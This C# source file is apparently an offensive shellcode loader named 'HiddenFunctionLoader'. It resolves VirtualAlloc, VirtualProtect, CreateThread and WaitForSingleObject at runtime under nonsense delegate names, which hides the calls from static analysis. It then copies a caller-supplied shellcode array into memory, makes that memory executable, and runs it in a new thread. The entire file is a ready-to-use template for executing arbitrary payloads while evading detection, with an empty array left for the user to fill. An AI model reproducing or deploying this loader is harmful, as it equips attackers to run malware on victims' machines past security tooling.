using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace HiddenFunctionLoader
{
    internal class Program
    {
        [DllImport("kernel32", SetLastError = true, CallingConvention = CallingConvention.Cdecl)]
        static extern IntPtr LoadLibraryA(string lpLibName);

        [DllImport("kernel32", SetLastError = true, CallingConvention = CallingConvention.Cdecl)]
        static extern IntPtr GetProcAddress(IntPtr libhandle, string address_name);

        [DllImport("kernel32", SetLastError = true, CallingConvention = CallingConvention.Cdecl)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32", SetLastError = true, CallingConvention = CallingConvention.Cdecl)]
        static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32", SetLastError = true, CallingConvention = CallingConvention.Cdecl)]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32", SetLastError = true, CallingConvention = CallingConvention.Cdecl)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        static void Main(string[] args)
        {
            // Replace with your shellcode bytes
            byte[] pleaseRun = new byte[] {};

            const uint PAGE_READWRITE = 0x04;
            const uint PAGE_EXECUTEREAD = 0x20;
            const uint MEM_COMMIT_RESERVE = 0x3000;

            uint OldProtection = 0;

            IntPtr k32 = LoadLibraryA("kernel32");

            IntPtr ptr1 = GetProcAddress(k32, "VirtualAlloc");
            IntPtr ptr2 = GetProcAddress(k32, "VirtualProtect");
            IntPtr ptr3 = GetProcAddress(k32, "CreateThread");
            IntPtr ptr4 = GetProcAddress(k32, "WaitForSingleObject");

            shabib enveloper = Marshal.GetDelegateForFunctionPointer<shabib>(ptr1);
            canteen cheetoDust = Marshal.GetDelegateForFunctionPointer<canteen>(ptr2);
            hoopla cantBelieveItsNotButter = Marshal.GetDelegateForFunctionPointer<hoopla>(ptr3);
            cancerousPickle itGoBrrr = Marshal.GetDelegateForFunctionPointer<cancerousPickle>(ptr4);

            var doStuffDammit = enveloper(IntPtr.Zero, pleaseRun.Length, MEM_COMMIT_RESERVE, PAGE_READWRITE);

            Marshal.Copy(pleaseRun, 0, doStuffDammit, pleaseRun.Length);

            cheetoDust(doStuffDammit, pleaseRun.Length, PAGE_EXECUTEREAD, out OldProtection);

            uint th;
            cantBelieveItsNotButter(IntPtr.Zero, 0, doStuffDammit, IntPtr.Zero, 0, out th);

            itGoBrrr((IntPtr)th, 0xFFFFFFFF);
        }

        public delegate IntPtr shabib(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);
        public delegate bool canteen(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
        public delegate IntPtr hoopla(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        public delegate uint cancerousPickle(IntPtr hHandle, uint dwMilliseconds);
    }
}
